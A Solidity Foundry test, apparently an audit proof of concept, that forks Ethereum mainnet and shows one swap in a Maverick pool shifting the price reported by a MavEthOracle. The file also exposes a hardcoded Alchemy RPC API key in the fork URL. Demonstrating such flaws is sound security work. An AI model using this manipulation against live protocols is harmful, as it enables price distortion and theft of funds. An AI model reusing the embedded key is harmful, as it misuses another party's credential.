pragma solidity 0.8.17;

import { Test } from "forge-std/Test.sol";
import 'forge-std/console.sol';

import { WETH9_ADDRESS, TOKE_MAINNET, WSTETH_MAINNET } from "test/utils/Addresses.sol";

import { IPool } from "src/interfaces/external/maverick/IPool.sol";
import { MavEthOracle } from "src/oracles/providers/MavEthOracle.sol";
import { SystemRegistry, ISystemRegistry } from "src/SystemRegistry.sol";
import { RootPriceOracle } from "src/oracles/RootPriceOracle.sol";
import { AccessController, IAccessController } from "src/security/AccessController.sol";
import { IPriceOracle } from "src/interfaces/oracles/IPriceOracle.sol";
import { SwEthEthOracle} from "src/oracles/providers/SwEthEthOracle.sol";
import { EthPeggedOracle} from "src/oracles/providers/EthPeggedOracle.sol";
import { IswETH } from "src/interfaces/external/swell/IswETH.sol";
import { IPoolPositionDynamicSlim } from "src/interfaces/external/maverick/IPoolPositionDynamicSlim.sol";
import { IERC20 } from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract NewTest is Test {
  SystemRegistry public registry;
  AccessController public accessControl;
  RootPriceOracle public rootOracle;
  MavEthOracle public mavOracle;

  function setUp() external {
    vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/aA2nkPDT5ZcPX5S2R32XLUHNI5feX1dx", 17224221);
    registry = new SystemRegistry(TOKE_MAINNET, WETH9_ADDRESS);
    accessControl = new AccessController(address(registry));
    registry.setAccessController(address(accessControl));
    rootOracle = new RootPriceOracle(registry);
    registry.setRootPriceOracle(address(rootOracle));
    mavOracle = new MavEthOracle(registry);
  }

  function swapCallback(
    uint256 amountToPay,
    uint256 amountOut,
    bytes calldata _data
  ) external {
    address tokenIn = abi.decode(_data, (address));
    IERC20(tokenIn).transfer(msg.sender, amountToPay);
  }

  function test_MaverickOracleManipulation() external {
    IswETH swETH = IswETH(0xf951E335afb289353dc249e82926178EaC7DEd78);
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address boostedPosition = 0xF917FE742C530Bd66BcEbf64B42c777B13aac92c;
    SwEthEthOracle swEthOracle = new SwEthEthOracle(registry, swETH);
    EthPeggedOracle ethOracle = new EthPeggedOracle(registry);
    rootOracle.registerMapping(address(swETH), swEthOracle);
    rootOracle.registerMapping(weth, ethOracle);

    (uint256 reserveA, uint256 reserveB) = IPoolPositionDynamicSlim(boostedPosition).getReserves();
    console.log("reserves", reserveA, reserveB);
    uint256 mavPriceBefore = mavOracle.getPriceInEth(boostedPosition);
    console.log("mavOracle price before", mavPriceBefore);

    //swap
    deal(address(swETH), address(this), 1e24);
    address pool = IPoolPositionDynamicSlim(boostedPosition).pool();
    IPool(pool).swap(
        address(this),
        1e18,
        false,
        false,
        0,
        abi.encode(address(swETH))
    );

    (reserveA, reserveB) = IPoolPositionDynamicSlim(boostedPosition).getReserves();
    console.log("reserves", reserveA, reserveB);
    uint256 mavPriceAfter = mavOracle.getPriceInEth(boostedPosition);
    console.log("mavOracle price after", mavPriceAfter);
    
    require(mavPriceBefore != mavPriceAfter);
  }
}